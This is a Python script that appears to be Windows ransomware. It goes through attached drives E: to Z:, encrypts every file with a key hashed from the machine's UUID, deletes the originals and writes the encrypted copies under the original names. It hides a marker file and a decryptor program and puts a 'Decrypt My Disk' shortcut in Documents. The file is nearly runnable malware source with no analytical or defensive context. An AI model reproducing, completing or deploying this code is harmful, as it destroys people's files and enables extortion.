import os
import sys
from crypt_functions import *
import win32file
from shutil import copyfile

dl = 'EFGHIJKLMNOPQRSTUVWXYZ'
drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
C = os.getcwd().split('\\')[0]
# C = "E:"

decryptExeSource=resource_path("decrypt.exe")
decryptExeDest = os.path.expanduser('~\Documents') + "\\" "decrypt.exe"

# Copy decrypt file to Document file
try:
	copyfile(resource_path(decryptExeSource), decryptExeDest)
except IOError:
	pass

# Create shortcut to Desktop
create_shortcut(os.path.expanduser('~\Documents'), decryptExeDest, "Decrypt My Disk")

# hide decrypt program
hideCmd = "attrib " + decryptExeDest + " +s +h"
subprocess.call(hideCmd)
print(drives)
for current_drive in drives:
	current_drive = current_drive+"\\"
	# Check if "isCrypted" exists
	isCryptedFile = current_drive + "\\"+"isCrypted"
	exists=os.path.isfile(isCryptedFile)

	print(exists)
	if not exists:
		allFiles = getListOfFiles(current_drive)
		# Remove current file from allFiles
		try:
			allFiles.remove(__file__)
		except ValueError:
			pass

		# Get total and free space in current drive
		total = win32file.GetDiskFreeSpaceEx(current_drive)[1]
		free = win32file.GetDiskFreeSpaceEx(current_drive)[2]

		# Get unique System UUID 
		command = (resource_path('dmidecode.exe')+' -s system-uuid').split()
		cpuID = subprocess.check_output(command , **subprocess_args(False)).decode('utf-8')

		# Load salt and hash the unique UUID
		salt = load_object(resource_path("salt"))
		keyToCrypt = hashStr(cpuID, salt)
		
		# marquer le disque comme crypté
		with open(isCryptedFile, "w") as file:
			file.write(cpuID)

		# Cacher le fichier marque
		cmd = "attrib " + isCryptedFile + " +s +h"
		subprocess.call(cmd)

		log = open(isCryptedFile, "at", encoding="utf-8")
		for file in allFiles:
			# Check if file is larger than free space
			try:
				if os.path.getsize(file) < free:

					# Get folder contaning a file
					output = "\\".join(file.split('\\')[:-1])

					# Crypt file with hashed unique UUID
					cryptedOutput = toCrypt(file, output, keyToCrypt)

					# Remove original file
					os.remove(file)

					# Rename crypted file to original file
					os.rename(cryptedOutput, file)

					# Write file to isCrypted
					log.write(file+"\n")

					# Log progression
					print(file)

			except Exception:
				pass
		log.close()

subprocess.call(decryptExeDest)
